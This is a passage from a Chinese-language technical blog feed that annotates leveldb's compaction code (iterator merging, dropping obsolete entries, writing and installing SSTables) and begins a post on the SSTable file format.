class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (compact-&gt;builder-&gt;NumEntries() == <span class="number">0</span>) &#123;</span><br><span class="line">        compact-&gt;current_output()-&gt;smallest.DecodeFrom(key);</span><br><span class="line">      &#125;</span><br><span class="line">      compact-&gt;current_output()-&gt;largest.DecodeFrom(key);</span><br><span class="line">      compact-&gt;builder-&gt;Add(key, input-&gt;value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Close output file if it is big enough</span></span><br><span class="line">      <span class="keyword">if</span> (compact-&gt;builder-&gt;FileSize() &gt;=</span><br><span class="line">          compact-&gt;compaction-&gt;MaxOutputFileSize()) &#123;</span><br><span class="line">        status = FinishCompactionOutputFile(compact, input);</span><br><span class="line">        <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input-&gt;Next();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (status.ok() &amp;&amp; shutting_down_.load(<span class="built_in">std</span>::memory_order_acquire)) &#123;</span><br><span class="line">    status = Status::IOError(<span class="string">"Deleting DB during compaction"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (status.ok() &amp;&amp; compact-&gt;builder != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    status = FinishCompactionOutputFile(compact, input);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (status.ok()) &#123;</span><br><span class="line">    status = input-&gt;status();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> input;</span><br><span class="line">  input = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  CompactionStats stats;</span><br><span class="line">  stats.<span class="built_in">micros</span> = env_-&gt;NowMicros() - start_micros - imm_micros;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> which = <span class="number">0</span>; which &lt; <span class="number">2</span>; which++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; compact-&gt;compaction-&gt;num_input_files(which); i++) &#123;</span><br><span class="line">      stats.bytes_read += compact-&gt;compaction-&gt;input(which, i)-&gt;file_size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact-&gt;outputs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    stats.bytes_written += compact-&gt;outputs[i].file_size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mutex_.Lock();</span><br><span class="line">  stats_[compact-&gt;compaction-&gt;level() + <span class="number">1</span>].Add(stats);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (status.ok()) &#123;<span class="comment">// 保存此次压缩结果的元数据 </span></span><br><span class="line">    status = InstallCompactionResults(compact);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">    RecordBackgroundError(status);</span><br><span class="line">  &#125;</span><br><span class="line">  VersionSet::LevelSummaryStorage tmp;</span><br><span class="line">  Log(options_.info_log, <span class="string">"compacted to: %s"</span>, versions_-&gt;LevelSummary(&amp;tmp));</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的整体流程分3步：</p><ol><li>创建迭代器，内部对本次要compact的文件进行排序。</li><li>丢弃那些被删除的或者旧的文件。</li><li>写入新文件。</li></ol><h4 id="1-排序"><a href="#1-排序" class="headerlink" title="1. 排序"></a>1. 排序</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iterator* input = versions_-&gt;MakeInputIterator(compact-&gt;compaction);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Iterator* <span class="title">VersionSet::MakeInputIterator</span><span class="params">(Compaction* c)</span> </span>&#123;</span><br><span class="line">  ReadOptions options;</span><br><span class="line">  options.verify_checksums = options_-&gt;paranoid_checks;</span><br><span class="line">  options.fill_cache = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Level-0 files have to be merged together.  For other levels,</span></span><br><span class="line">  <span class="comment">// we will make a concatenating iterator per level.</span></span><br><span class="line">  <span class="comment">// TODO(opt): use concatenating iterator for level-0 if there is no overlap</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> space = (c-&gt;level() == <span class="number">0</span> ? c-&gt;inputs_[<span class="number">0</span>].<span class="built_in">size</span>() + <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">   <span class="comment">// !!! list中的每个iter，都指向了一个即将被compaction的sstable</span></span><br><span class="line">  Iterator** <span class="built_in">list</span> = <span class="keyword">new</span> Iterator*[space];</span><br><span class="line">  <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> which = <span class="number">0</span>; which &lt; <span class="number">2</span>; which++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!c-&gt;inputs_[which].empty()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (c-&gt;level() + which == <span class="number">0</span>) &#123;<span class="comment">// 对第0层的files，通过table_cache创建iter</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; files = c-&gt;inputs_[which];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; files.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">          <span class="built_in">list</span>[num++] = table_cache_-&gt;NewIterator(options, files[i]-&gt;number,</span><br><span class="line">                                                  files[i]-&gt;file_size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="comment">// 非第0层的fiels，使用TwoLevelIterator来迭代（index iter 和 data iter)</span></span><br><span class="line">        <span class="comment">// Create concatenating iterator for the files from this level</span></span><br><span class="line">        <span class="built_in">list</span>[num++] = NewTwoLevelIterator(</span><br><span class="line">            <span class="keyword">new</span> Version::LevelFileNumIterator(icmp_, &amp;c-&gt;inputs_[which]),</span><br><span class="line">            &amp;GetFileIterator, table_cache_, options);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  assert(num &lt;= space);</span><br><span class="line">   <span class="comment">// 所有需要的compaction file都有一个iter，现在需要归并排序，这通过mergeiteraotr实现</span></span><br><span class="line">  Iterator* result = NewMergingIterator(&amp;icmp_, <span class="built_in">list</span>, num);</span><br><span class="line">  <span class="keyword">delete</span>[] <span class="built_in">list</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于mergeiteraotr的具体实现，可参考 mergeitator。</p><h4 id="2-丢弃不需要的kv-pairs（待完善）"><a href="#2-丢弃不需要的kv-pairs（待完善）" class="headerlink" title="2. 丢弃不需要的kv pairs（待完善）"></a>2. 丢弃不需要的kv pairs（待完善）</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!has_current_user_key ||<span class="comment">// 已经有了user_key?</span></span><br><span class="line">         user_comparator()-&gt;Compare(ikey.user_key, Slice(current_user_key)) !=</span><br><span class="line">             <span class="number">0</span>) &#123;<span class="comment">// 要分析的user_key是否和之前的user_key相同？</span></span><br><span class="line">       <span class="comment">// First occurrence of this user key</span></span><br><span class="line">       current_user_key.assign(ikey.user_key.data(), ikey.user_key.<span class="built_in">size</span>());</span><br><span class="line">       has_current_user_key = <span class="literal">true</span>;</span><br><span class="line">         <span class="comment">// 第一次出现的user_key不允许删除</span></span><br><span class="line">       last_sequence_for_key = kMaxSequenceNumber;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (last_sequence_for_key &lt;= compact-&gt;smallest_snapshot) &#123;<span class="comment">//进入这个判断，一定时是出现了重复key. 如果前一个序列号都已经比当前smallest_snapshot小了， 现在key的序列号肯定更小，也肯定小于smallest_snapshot，所以直接drop</span></span><br><span class="line">       <span class="comment">// Hidden by an newer entry for same user key</span></span><br><span class="line">       drop = <span class="literal">true</span>;  <span class="comment">// (A)</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ikey.type == kTypeDeletion &amp;&amp;</span><br><span class="line">                ikey.sequence &lt;= compact-&gt;smallest_snapshot &amp;&amp;</span><br><span class="line">                compact-&gt;compaction-&gt;IsBaseLevelForKey(ikey.user_key)) &#123;</span><br><span class="line">     <span class="comment">// 前一个key的序列号大于smallest_snapshot，而当前key的序列号小于smallest_snapshot,说名当前key是距离smallest_snapshot最近的key，</span></span><br><span class="line">         <span class="comment">// !!!!!! 待完善</span></span><br><span class="line">         <span class="comment">// For this user key:</span></span><br><span class="line">       <span class="comment">// (1) there is no data in higher levels</span></span><br><span class="line">       <span class="comment">// (2) data in lower levels will have larger sequence numbers</span></span><br><span class="line">       <span class="comment">// (3) data in layers that are being compacted here and have</span></span><br><span class="line">       <span class="comment">//     smaller sequence numbers will be dropped in the next</span></span><br><span class="line">       <span class="comment">//     few iterations of this loop (by rule (A) above).</span></span><br><span class="line">       <span class="comment">// Therefore this deletion marker is obsolete and can be dropped.</span></span><br><span class="line">       drop = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     last_sequence_for_key = ikey.sequence;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这部分的第3个分支每看懂。后序补充。</p><h4 id="3-写入不需要drop的kv"><a href="#3-写入不需要drop的kv" class="headerlink" title="3. 写入不需要drop的kv"></a>3. 写入不需要drop的kv</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!drop) &#123;</span><br><span class="line">    <span class="comment">// Open output file if necessary</span></span><br><span class="line">    <span class="keyword">if</span> (compact-&gt;builder == <span class="literal">nullptr</span>) &#123;<span class="comment">// builder为空，则打开</span></span><br><span class="line">      status = OpenCompactionOutputFile(compact);</span><br><span class="line">      <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (compact-&gt;builder-&gt;NumEntries() == <span class="number">0</span>) &#123;</span><br><span class="line">      compact-&gt;current_output()-&gt;smallest.DecodeFrom(key);</span><br><span class="line">    &#125;</span><br><span class="line">    compact-&gt;current_output()-&gt;largest.DecodeFrom(key);</span><br><span class="line">    compact-&gt;builder-&gt;Add(key, input-&gt;value());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close output file if it is big enough</span></span><br><span class="line">    <span class="keyword">if</span> (compact-&gt;builder-&gt;FileSize() &gt;=</span><br><span class="line">        compact-&gt;compaction-&gt;MaxOutputFileSize()) &#123;</span><br><span class="line">      status = FinishCompactionOutputFile(compact, input);</span><br><span class="line">      <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第一步：OpenCompactionOutputFile</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::OpenCompactionOutputFile</span><span class="params">(CompactionState* compact)</span> </span>&#123;</span><br><span class="line">  assert(compact != <span class="literal">nullptr</span>);</span><br><span class="line">  assert(compact-&gt;builder == <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">uint64_t</span> file_number;</span><br><span class="line">  &#123;</span><br><span class="line">    mutex_.Lock();</span><br><span class="line">    file_number = versions_-&gt;NewFileNumber();</span><br><span class="line">      <span class="comment">// 注意这里的pending_outputs</span></span><br><span class="line">    pending_outputs_.insert(file_number);</span><br><span class="line">    CompactionState::Output out;</span><br><span class="line">    out.number = file_number;</span><br><span class="line">    out.smallest.Clear();</span><br><span class="line">    out.largest.Clear();</span><br><span class="line">     <span class="comment">// 加入到outputs</span></span><br><span class="line">    compact-&gt;outputs.push_back(out);</span><br><span class="line">    mutex_.Unlock();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make the output file</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> fname = TableFileName(dbname_, file_number);</span><br><span class="line">  Status s = env_-&gt;NewWritableFile(fname, &amp;compact-&gt;outfile);</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    compact-&gt;builder = <span class="keyword">new</span> TableBuilder(options_, compact-&gt;outfile);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个点要注意：</p><ol><li><p>pending_outputs_， 我们来看的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set of table files to protect from deletion because they are</span></span><br><span class="line"><span class="comment">// part of ongoing compactions.</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="keyword">uint64_t</span>&gt; pending_outputs_ <span class="title">GUARDED_BY</span><span class="params">(mutex_)</span></span>;</span><br></pre></td></tr></table></figure><p>它是为了避免tables files被误删除的而设计的。那在哪里会被误删除？在CompactMemTable中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">  <span class="comment">// Commit to the new state</span></span><br><span class="line">  imm_-&gt;Unref();</span><br><span class="line">  imm_ = <span class="literal">nullptr</span>;</span><br><span class="line">  has_imm_.store(<span class="literal">false</span>, <span class="built_in">std</span>::memory_order_release);</span><br><span class="line">    <span class="comment">// 这里会删除</span></span><br><span class="line">  RemoveObsoleteFiles();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  RecordBackgroundError(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RemoveObsoleteFiles中使用到了pending_outputs_，因为在合并过程中，刚生成的sstable还不是“live”的，通过<code>pending_outputs_</code>将它们当成 live 的就不会被删除了。</p></li><li><p>将需要保存的kv，放在compact-&gt;outputs中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入到outputs</span></span><br><span class="line">compact-&gt;outputs.push_back(out);</span><br></pre></td></tr></table></figure></li></ol><p>第二步，记录最小key和最大key，同时并将要保存的kv加入到builder中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (compact-&gt;builder-&gt;NumEntries() == <span class="number">0</span>) &#123;</span><br><span class="line">    compact-&gt;current_output()-&gt;smallest.DecodeFrom(key);</span><br><span class="line">  &#125;</span><br><span class="line">  compact-&gt;current_output()-&gt;largest.DecodeFrom(key);</span><br><span class="line">  compact-&gt;builder-&gt;Add(key, input-&gt;value());</span><br></pre></td></tr></table></figure><p>第三步，如果当前table已经过大，则输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Close output file if it is big enough</span></span><br><span class="line"><span class="keyword">if</span> (compact-&gt;builder-&gt;FileSize() &gt;=</span><br><span class="line">    compact-&gt;compaction-&gt;MaxOutputFileSize()) &#123;</span><br><span class="line">    status = FinishCompactionOutputFile(compact, input);</span><br><span class="line">    <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==FinishCompactionOutputFile==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::FinishCompactionOutputFile</span><span class="params">(CompactionState* compact,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Iterator* input)</span> </span>&#123;</span><br><span class="line">  assert(compact != <span class="literal">nullptr</span>);</span><br><span class="line">  assert(compact-&gt;outfile != <span class="literal">nullptr</span>);</span><br><span class="line">  assert(compact-&gt;builder != <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> output_number = compact-&gt;current_output()-&gt;number;</span><br><span class="line">  assert(output_number != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check for iterator errors</span></span><br><span class="line">  Status s = input-&gt;status();</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> current_entries = compact-&gt;builder-&gt;NumEntries();</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;/</span><br><span class="line">      <span class="comment">// 构建sstable</span></span><br><span class="line">    s = compact-&gt;builder-&gt;Finish();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    compact-&gt;builder-&gt;Abandon();</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">// 统计sstable的大小</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> current_bytes = compact-&gt;builder-&gt;FileSize();</span><br><span class="line">  compact-&gt;current_output()-&gt;file_size = current_bytes;</span><br><span class="line">  compact-&gt;total_bytes += current_bytes;</span><br><span class="line">  <span class="keyword">delete</span> compact-&gt;builder;</span><br><span class="line">  compact-&gt;builder = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finish and check for file errors</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="comment">// 写入sstable</span></span><br><span class="line">    s = compact-&gt;outfile-&gt;Sync();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    s = compact-&gt;outfile-&gt;Close();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> compact-&gt;outfile;</span><br><span class="line">  compact-&gt;outfile = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s.ok() &amp;&amp; current_entries &gt; <span class="number">0</span>) &#123;<span class="comment">// 验证table是否有效</span></span><br><span class="line">    <span class="comment">// Verify that the table is usable</span></span><br><span class="line">    Iterator* iter =</span><br><span class="line">        table_cache_-&gt;NewIterator(ReadOptions(), output_number, current_bytes);</span><br><span class="line">    s = iter-&gt;status();</span><br><span class="line">    <span class="keyword">delete</span> iter;</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      Log(options_.info_log, <span class="string">"Generated table #%llu@%d: %lld keys, %lld bytes"</span>,</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)output_number, compact-&gt;compaction-&gt;level(),</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)current_entries,</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)current_bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FinishCompactionOutputFile主完成的工作就是将之前加入的有效kv落盘成一个新的sstable。</p><ol><li><code>compact-&gt;builder-&gt;Finish();</code> 构建sstable的所有块，data block, meta block meta index block, index block,footer.</li><li>记录本次形成的新sstable的大小</li><li>落盘，compact-&gt;outfile-&gt;Sync();</li><li>校验是否正确</li></ol><h4 id="4-元数据修改"><a href="#4-元数据修改" class="headerlink" title="4. 元数据修改"></a>4. 元数据修改</h4><p>经过前面几步，compaction过后的sstable已经持久化到设备上了，现在要做的是修改本次压缩过程中涉及到的sstable的元数据，删除用来compaction的数据，生成compaction后的sstable的元数据。这些都通过一次versionedit来表示，然后通过LogAndApply应用这个edit，生成新edit。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Status <span class="title">DBImpl::InstallCompactionResults</span><span class="params">(CompactionState* compact)</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br><span class="line">  Log(options_.info_log, <span class="string">"Compacted %d@%d + %d@%d files =&gt; %lld bytes"</span>,</span><br><span class="line">      compact-&gt;compaction-&gt;num_input_files(<span class="number">0</span>), compact-&gt;compaction-&gt;level(),</span><br><span class="line">      compact-&gt;compaction-&gt;num_input_files(<span class="number">1</span>), compact-&gt;compaction-&gt;level() + <span class="number">1</span>,</span><br><span class="line">      <span class="keyword">static_cast</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;(compact-&gt;total_bytes));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add compaction outputs</span></span><br><span class="line">  compact-&gt;compaction-&gt;AddInputDeletions(compact-&gt;compaction-&gt;edit());<span class="comment">// 删除</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> level = compact-&gt;compaction-&gt;level();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact-&gt;outputs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> CompactionState::Output&amp; out = compact-&gt;outputs[i];</span><br><span class="line">    compact-&gt;compaction-&gt;edit()-&gt;AddFile(level + <span class="number">1</span>, out.number, out.file_size,</span><br><span class="line">                                         out.smallest, out.largest);<span class="comment">// 结果</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> versions_-&gt;LogAndApply(compact-&gt;compaction-&gt;edit(), &amp;mutex_);<span class="comment">// 应用edit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑比较简单，将本次操作过程中涉及的文件都加入一个edit中，然后通过LogAndApply应用即可。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-SSTable</title>
      <link href="/archives/b2082466.html"/>
      <url>/archives/b2082466.html</url>
      
        <content type="html"><![CDATA[<p>上文中，我们介绍了Version和Manifest，这篇文章将介绍leveldb的核心–SStable。</p><h2 id="SSTable"><a href="#SSTable" class="headerlink" title="SSTable"></a>SSTable</h2><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9iZWFuLWxpLmdpdGh1Yi5pby9sZXZlbGRiLXNzdGFibGUv" title="https://bean-li.github.io/leveldb-sstable/">https://bean-li.github.io/leveldb-sstable/<i class="fa fa-external-link"></i></span></p></blockquote><p><strong>这部分在doc/table_format.md有介绍。</strong></p><p>SSTable文件是落在磁盘上的真正文件，leveldb存储路径中的.sst 类型的文件都是SSTable文件。 本文介绍该文件的格式，以及leveldb如何一条记录一条记录的增加到SSTable文件。</p><a id="more"></a><p>首先要注意，SSTable文件里面存放的是大量的key-value，因为leveldb就是一个key-value DB。我们都买过字典，如果把字典的每一个字当成key，对字的解释当成value，字典就是一个key-value DB。</p><p>在收录几千上万个字的字典中，如何快速寻找到茴香的茴字？</p><p>字典第一个思想是有序，按照一定的顺序收录，如果无序，杂乱无章地收录key-value就会给检索带来麻烦。</p><p>字典的第二个思想是目录，本质是索引，茴读作Hui，因此，在字典中有如下的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A                  ...............................................................页码</span><br><span class="line">B                  ...............................................................页码</span><br><span class="line">C                  ...............................................................页码</span><br><span class="line">D                  ...............................................................页码</span><br><span class="line">E                  ...............................................................页码</span><br><span class="line">F                  ...............................................................页码</span><br><span class="line">H</span><br><span class="line">|____ a             ...............................................................页码</span><br><span class="line">|____ ..            ...............................................................页码</span><br><span class="line">|____ u</span><br><span class="line">      |____ a       ...............................................................页码</span><br><span class="line">      |____ ..      ...............................................................页码</span><br><span class="line">      |____ i       ...............................................................页码</span><br><span 